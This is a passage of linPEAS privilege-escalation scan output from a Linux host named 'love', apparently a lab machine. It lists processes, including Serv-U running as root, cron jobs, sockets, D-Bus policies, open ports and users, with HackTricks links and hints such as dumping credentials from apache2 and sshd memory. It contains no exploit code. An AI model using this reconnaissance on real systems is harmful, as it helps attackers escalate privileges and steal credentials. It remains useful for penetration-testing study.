gdm       1671  0.0  0.3 201996  3460 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-mouse
gdm       1677  0.0  1.2 591084 12348 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-power
gdm       1680  0.0  0.6 267020  6476 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-print-notifications
gdm       1686  0.0  0.3 202016  3376 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-rfkill
gdm       1689  0.0  0.3 275732  3424 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-screensaver-proxy
gdm       1695  0.0  0.5 305216  5460 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-sharing
gdm       1700  0.0  0.5 377896  5224 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-smartcard
gdm       1705  0.0  0.5 332828  5528 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-sound
gdm       1710  0.0  1.1 502284 11572 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-wacom
gdm       1531  0.0  0.7  76924  7276 ?        Ss   19:17   0:00 /lib/systemd/systemd --user
gdm       1532  0.0  0.1 195960  1412 ?        S    19:17   0:00  _ (sd-pam)
gdm       1551  0.0  0.4  50264  4084 ?        Ss   19:17   0:00  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
gdm       1558  0.0  0.4 349248  4148 ?        Ssl  19:17   0:00  _ /usr/lib/at-spi2-core/at-spi-bus-launcher
gdm       1563  0.0  0.3  49920  3736 ?        S    19:17   0:00  |   _ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
gdm       1566  0.0  0.5 220780  5096 ?        Sl   19:17   0:00  _ /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
gdm       1606  0.0  0.7 1245004 7756 ?        Ssl  19:17   0:00  _ /usr/bin/pulseaudio --daemonize=no
gdm       1629  0.0  0.4 278556  4064 ?        Sl   19:17   0:00  _ /usr/lib/ibus/ibus-portal
gdm       1637  0.0  0.3 271560  3836 ?        Ssl  19:17   0:00  _ /usr/libexec/xdg-permission-store
gdm       1820  0.0  0.3 187772  3988 ?        Sl   19:17   0:00  _ /usr/lib/dconf/dconf-service
root      1591  0.0  0.6 322332  6100 ?        Ssl  19:17   0:00 /usr/lib/upower/upowerd
rtkit     1607  0.0  0.2 183504  2944 ?        SNsl 19:17   0:00 /usr/lib/rtkit/rtkit-daemon
  └─(Caps) 0x0000000000800004=cap_dac_read_search,cap_sys_nice
gdm       1625  0.0  1.0 344064 10804 tty1     Sl   19:17   0:00 /usr/lib/ibus/ibus-x11 --kill-daemon
root      1645  0.0  0.5 296872  5392 ?        Ssl  19:17   0:00 /usr/lib/x86_64-linux-gnu/boltd
root      1650  0.0  0.8 374852  8032 ?        Ssl  19:17   0:00 /usr/lib/packagekit/packagekitd
colord    1721  0.0  1.0 324976 10476 ?        Ssl  19:17   0:00 /usr/lib/colord/colord
whoopsie  1760  0.0  0.8 390552  8984 ?        Ssl  19:17   0:00 /usr/bin/whoopsie -f
kernoops  1771  0.0  0.2  56940  2196 ?        Ss   19:17   0:00 /usr/sbin/kerneloops --test
kernoops  1773  0.0  0.0  56940   420 ?        Ss   19:17   0:00 /usr/sbin/kerneloops
root      1798  0.1  1.0 607484 10224 ?        Ssl  19:17   0:08 ./Serv-U -startservice
root      1838  0.0  0.0   4624   832 ?        Ss   19:17   0:00 /bin/sh /usr/lib/apt/apt.systemd.daily update
root      1842  0.0  0.1   4624  1788 ?        S    19:17   0:00  _ /bin/sh /usr/lib/apt/apt.systemd.daily lock_is_held update
root      1892 99.8 12.2 244016 122280 ?       RN   19:18  94:28      _ /usr/bin/python3 /usr/bin/unattended-upgrade --download-only
root      2179  0.0  1.1 492000 11008 ?        Ssl  19:19   0:00 /usr/sbin/NetworkManager --no-daemon[0m
root      2428  0.0  0.6 107700  6232 ?        Ss   19:21   0:00 /usr/sbin/cupsd -l
root      2429  0.0  0.8 303668  8268 ?        Ssl  19:21   0:00 /usr/sbin/cups-browsed
love      3905  0.0  0.7  76764  7628 ?        Ss   20:45   0:00 /lib/systemd/systemd --user
love      3906  0.0  0.2 195960  2240 ?        S    20:45   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                            
                                                                                                                        
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                               
Proc 424 with ppid 1 is run by user systemd-resolve but the ppid user is root                                           
Proc 435 with ppid 1 is run by user syslog but the ppid user is root
Proc 438 with ppid 1 is run by user messagebus but the ppid user is root
Proc 564 with ppid 1 is run by user avahi but the ppid user is root
Proc 835 with ppid 1 is run by user mysql but the ppid user is root
Proc 1531 with ppid 1 is run by user gdm but the ppid user is root
Proc 1543 with ppid 1522 is run by user gdm but the ppid user is root
Proc 1607 with ppid 1 is run by user rtkit but the ppid user is root
Proc 1625 with ppid 1 is run by user gdm but the ppid user is root
Proc 1721 with ppid 1 is run by user colord but the ppid user is root
Proc 1760 with ppid 1 is run by user whoopsie but the ppid user is root
Proc 1771 with ppid 1 is run by user kernoops but the ppid user is root
Proc 1773 with ppid 1 is run by user kernoops but the ppid user is root
Proc 2456 with ppid 872 is run by user www-data but the ppid user is root
Proc 2999 with ppid 872 is run by user www-data but the ppid user is root
Proc 3011 with ppid 872 is run by user www-data but the ppid user is root
Proc 3015 with ppid 872 is run by user www-data but the ppid user is root
Proc 3039 with ppid 872 is run by user www-data but the ppid user is root
Proc 3576 with ppid 872 is run by user www-data but the ppid user is root
Proc 3684 with ppid 872 is run by user www-data but the ppid user is root
Proc 3850 with ppid 872 is run by user www-data but the ppid user is root
Proc 3867 with ppid 872 is run by user www-data but the ppid user is root
Proc 3905 with ppid 1 is run by user love but the ppid user is root
Proc 4009 with ppid 3900 is run by user love but the ppid user is root
Proc 4066 with ppid 872 is run by user www-data but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                      
COMMAND     PID  TID            USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                         

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                      
gdm-password Not Found                                                                                                  
gnome-keyring-daemon Not Found                                                                                          
lightdm Not Found                                                                                                       
vsftpd Not Found                                                                                                        
apache2 process found (dump creds from memory as root)                                                                  
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                  
/usr/bin/crontab                                                                                                        
incrontab Not Found
-rw-r--r-- 1 root     root      723 Apr  9  2020 /etc/crontab                                                           

/etc/cron.d:
total 32
drwxr-xr-x   2 root root  4096 Apr  2  2020 .
drwxr-xr-x 130 root root 12288 Jun 16  2022 ..
-rw-r--r--   1 root root   285 May 29  2017 anacron
-rw-r--r--   1 root root   712 Dec 17  2018 php
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root   191 Oct 20  2019 popularity-contest

/etc/cron.daily:
total 76
drwxr-xr-x   2 root root  4096 May 27  2020 .
drwxr-xr-x 130 root root 12288 Jun 16  2022 ..
-rwxr-xr-x   1 root root   311 May 29  2017 0anacron
-rwxr-xr-x   1 root root   539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root   376 Nov 20  2017 apport
-rwxr-xr-x   1 root root  1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root   355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root   384 Dec 13  2012 cracklib-runtime
-rwxr-xr-x   1 root root  1176 Nov  3  2017 dpkg
-rwxr-xr-x   1 root root   372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root  1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root   538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root   249 Jan 25  2018 passwd
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root   246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x   1 root root   214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Aug  6  2019 .
drwxr-xr-x 130 root root 12288 Jun 16  2022 ..
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Aug  6  2019 .
drwxr-xr-x 130 root root 12288 Jun 16  2022 ..
-rwxr-xr-x   1 root root   313 May 29  2017 0anacron
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 32
drwxr-xr-x   2 root root  4096 Aug  6  2019 .
drwxr-xr-x 130 root root 12288 Jun 16  2022 ..
-rwxr-xr-x   1 root root   312 May 29  2017 0anacron
-rwxr-xr-x   1 root root   723 Apr  7  2018 man-db
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root   211 Nov 12  2018 update-notifier-common

/var/spool/anacron:
total 20
drwxr-xr-x 2 www-data www-data 4096 Oct 20  2019 .
drwxr-xr-x 6 www-data www-data 4096 Oct 20  2019 ..
-rw------- 1 root     root        9 May 15 19:27 cron.daily
-rw------- 1 root     root        9 May 15 19:37 cron.monthly
-rw------- 1 root     root        9 May 15 19:32 cron.weekly

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )



SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                          
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                       

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                             
/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path                       
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path
/etc/systemd/system/mysqld.service could be executing some relative path
/etc/systemd/system/mysql.service could be executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                               
NEXT                         LEFT        LAST                         PASSED               UNIT                         ACTIVATES
Mon 2023-05-15 21:03:31 IST  10min left  Mon 2023-05-15 20:00:07 IST  52min ago            anacron.timer                anacron.service
Mon 2023-05-15 21:09:00 IST  16min left  Mon 2023-05-15 20:39:00 IST  13min ago            phpsessionclean.timer        phpsessionclean.service
Tue 2023-05-16 02:54:26 IST  6h left     Mon 2023-05-15 19:19:28 IST  1h 33min ago         motd-news.timer              motd-news.service
Tue 2023-05-16 19:31:47 IST  22h left    Mon 2023-05-15 19:31:47 IST  1h 20min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2023-05-22 00:00:00 IST  6 days left Mon 2023-05-15 19:19:28 IST  1h 33min ago         fstrim.timer                 fstrim.service
n/a                          n/a         Sat 2023-02-18 04:12:09 IST  2 months 25 days ago apt-daily-upgrade.timer      apt-daily-upgrade.service
n/a                          n/a         Sat 2023-02-18 04:12:09 IST  2 months 25 days ago apt-daily.timer              apt-daily.service
n/a                          n/a         n/a                          n/a                  snapd.snap-repair.timer     
n/a                          n/a         n/a                          n/a                  ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                               
/etc/systemd/system/snapd.snap-repair.timer                                                                             

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                              
/etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                        
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                                 
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                                 
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core18/1066/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core18/1066/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                        
/snap/core18/1066/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                       
/snap/core18/1066/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                
/snap/core18/1066/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                
/snap/core18/1066/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core18/1066/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                            
/snap/core18/1066/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                                     
/snap/core18/1066/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                                     
/snap/core18/1223/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core18/1223/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                        
/snap/core18/1223/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                       
/snap/core18/1223/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                
/snap/core18/1223/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                
/snap/core18/1223/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core18/1223/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                            
/snap/core18/1223/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                                     
/snap/core18/1223/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                                     

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                              
/run/acpid.socket                                                                                                       
  └─(Read Write)
/run/avahi-daemon/socket
  └─(Read Write)
/run/cups/cups.sock
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/NetworkManager/private-dhcp
  └─(Read )
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1000/bus
  └─(Read Write)
/run/user/1000/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/run/user/121/bus
/run/user/121/gnupg/S.dirmngr
/run/user/121/gnupg/S.gpg-agent
/run/user/121/gnupg/S.gpg-agent.browser
/run/user/121/gnupg/S.gpg-agent.extra
/run/user/121/gnupg/S.gpg-agent.ssh
/run/user/121/pulse/native
/run/user/121/systemd/private
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/tmp/dbus-BaXlVSLh
/tmp/dbus-FdNK7c2v
/tmp/dbus-G0XXsiEA
/tmp/dbus-khWxFP9g
/tmp/dbus-mWjGXxtu
/tmp/dbus-rIOGPzgn08
/tmp/.ICE-unix/1554
  └─(Read Write)
/tmp/.X11-unix/X0
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)                       
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
  <policy group="lp">)
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/gdm.conf (  <policy user="gdm">)
Possible weak user policy found on /etc/dbus-1/system.d/kerneloops.conf (  <policy user="kernoops">)
Possible weak user policy found on /etc/dbus-1/system.d/net.hadess.SensorProxy.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.ColorManager.conf (  <policy user="colord">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf (        <policy user="whoopsie">)                                                                                                                  
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf (  <policy user="rtkit">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)
Possible weak user policy found on /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf (  <policy user="cups-pk-helper">)                                                                                                             
Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                
NAME                                       PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                       434 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
:1.1                                       424 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.18                                      553 networkd-dispat root             :1.18         networkd-dispatcher.se…ce -          -                  
:1.19                                      672 unattended-upgr root             :1.19         unattended-upgrades.se…ce -          -                  
:1.2                                         1 systemd         root             :1.2          init.scope                -          -                  
:1.20                                     1516 gdm3            root             :1.20         gdm.service               -          -                  
:1.21                                     1522 gdm-session-wor root             :1.21         session-c1.scope          c1         -                  
:1.23                                     1545 Xorg            gdm              :1.23         session-c1.scope          c1         -                  
:1.24                                     1531 systemd         gdm              :1.24         user@121.service          -          -                  
:1.26                                     1554 gnome-session-b gdm              :1.26         session-c1.scope          c1         -                  
:1.28                                     1584 gnome-shell     gdm              :1.28         session-c1.scope          c1         -                  
:1.29                                     1591 upowerd         root             :1.29         upower.service            -          -                  
:1.3                                       571 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
:1.31                                     1607 rtkit-daemon    root             :1.31         rtkit-daemon.service      -          -                  
:1.46                                     1645 boltd           root             :1.46         bolt.service              -          -                  
:1.47                                     1650 packagekitd     root             :1.47         packagekit.service        -          -                  
:1.48                                     1670 gsd-media-keys  gdm              :1.48         session-c1.scope          c1         -                  
:1.49                                     1664 gsd-color       gdm              :1.49         session-c1.scope          c1         -                  
:1.5                                       552 udisksd         root             :1.5          udisks2.service           -          -                  
:1.50                                     1677 gsd-power       gdm              :1.50         session-c1.scope          c1         -                  
:1.51                                     1669 gsd-keyboard    gdm              :1.51         session-c1.scope          c1         -                  
:1.52                                     1721 colord          colord           :1.52         colord.service            -          -                  
:1.57                                     1771 kerneloops      kernoops         :1.57         kerneloops.service        -          -                  
:1.58                                     1773 kerneloops      kernoops         :1.58         kerneloops.service        -          -                  
:1.59                                     1760 whoopsie        whoopsie         :1.59         whoopsie.service          -          -                  
:1.6                                       564 avahi-daemon    avahi            :1.6          avahi-daemon.service      -          -                  
:1.61                                     1760 whoopsie        whoopsie         :1.61         whoopsie.service          -          -                  
:1.7                                       556 wpa_supplicant  root             :1.7          wpa_supplicant.service    -          -                  
:1.71                                     2179 NetworkManager  root             :1.71         NetworkManager.service    -          -                  
:1.72                                     2428 cupsd           root             :1.72         cups.service              -          -                  
:1.73                                     2429 cups-browsed    root             :1.73         cups-browsed.service      -          -                  
:1.74                                     2429 cups-browsed    root             :1.74         cups-browsed.service      -          -                  
:1.8                                       631 polkitd         root             :1.8          polkit.service            -          -                  
:1.82                                    13084 busctl          love             :1.82         session-6.scope           6          -                  
:1.9                                       558 ModemManager    root             :1.9          ModemManager.service      -          -                  
com.hp.hplip                                 - -               -                (activatable) -                         -         
com.ubuntu.LanguageSelector                  - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties                - -               -                (activatable) -                         -         
com.ubuntu.SystemService                     - -               -                (activatable) -                         -         
com.ubuntu.WhoopsiePreferences               - -               -                (activatable) -                         -         
fi.epitest.hostap.WPASupplicant            556 wpa_supplicant  root             :1.7          wpa_supplicant.service    -          -                  
fi.w1.wpa_supplicant1                      556 wpa_supplicant  root             :1.7          wpa_supplicant.service    -          -                  
io.netplan.Netplan                           - -               -                (activatable) -                         -         
org.bluez                                    - -               -                (activatable) -                         -         
org.debian.apt                               - -               -                (activatable) -                         -         
org.freedesktop.Accounts                   571 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
org.freedesktop.Avahi                      564 avahi-daemon    avahi            :1.6          avahi-daemon.service      -          -                  
org.freedesktop.ColorManager              1721 colord          colord           :1.52         colord.service            -          -                  
org.freedesktop.DBus                         1 systemd         root             -             init.scope                -          -                  
org.freedesktop.GeoClue2                     - -               -                (activatable) -                         -         
org.freedesktop.ModemManager1              558 ModemManager    root             :1.9          ModemManager.service      -          -                  
org.freedesktop.NetworkManager            2179 NetworkManager  root             :1.71         NetworkManager.service    -          -                  
org.freedesktop.PackageKit                1650 packagekitd     root             :1.47         packagekit.service        -          -                  
org.freedesktop.PolicyKit1                 631 polkitd         root             :1.8          polkit.service            -          -                  
org.freedesktop.RealtimeKit1              1607 rtkit-daemon    root             :1.31         rtkit-daemon.service      -          -                  
org.freedesktop.UDisks2                    552 udisksd         root             :1.5          udisks2.service           -          -                  
org.freedesktop.UPower                    1591 upowerd         root             :1.29         upower.service            -          -                  
org.freedesktop.bolt                      1645 boltd           root             :1.46         bolt.service              -          -                  
org.freedesktop.fwupd                        - -               -                (activatable) -                         -         
org.freedesktop.hostname1                    - -               -                (activatable) -                         -         
org.freedesktop.locale1                      - -               -                (activatable) -                         -         
org.freedesktop.login1                     434 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
org.freedesktop.network1                     - -               -                (activatable) -                         -         
org.freedesktop.nm_dispatcher                - -               -                (activatable) -                         -         
org.freedesktop.resolve1                   424 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1                     1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald                     - -               -                (activatable) -                         -         
org.freedesktop.timedate1                    - -               -                (activatable) -                         -         
org.gnome.DisplayManager                  1516 gdm3            root             :1.20         gdm.service               -          -                  
org.opensuse.CupsPkHelper.Mechanism          - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                     
                              ╚═════════════════════╝                                                                   
╔══════════╣ Hostname, hosts and DNS
election                                                                                                                
127.0.0.1       localhost
127.0.1.1       love

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                     
link-local 169.254.0.0
ens35: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.213.211  netmask 255.255.255.0  broadcast 192.168.213.255
        inet6 fe80::250:56ff:feba:132  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:ba:01:32  txqueuelen 1000  (Ethernet)
        RX packets 294293  bytes 39712745 (39.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 338015  bytes 93133227 (93.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 786  bytes 79534 (79.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 786  bytes 79534 (79.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                           
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                       
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43958         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:43958               :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                      
                                                                                                                        


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                     
                               ╚═══════════════════╝                                                                    
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                            
netpgpkeys Not Found
netpgp Not Found                                                                                                        
                                                                                                                        
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                        
                                                                                                                        
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                  
ptrace protection is enabled (1)                                                                                        

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2              
                                                                                                                        
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                         

╔══════════╣ Users with console
love:x:1000:1000:love,,,:/home/love:/bin/bash                                                                           
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                  
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(uuidd) gid=111(uuidd) groups=111(uuidd)
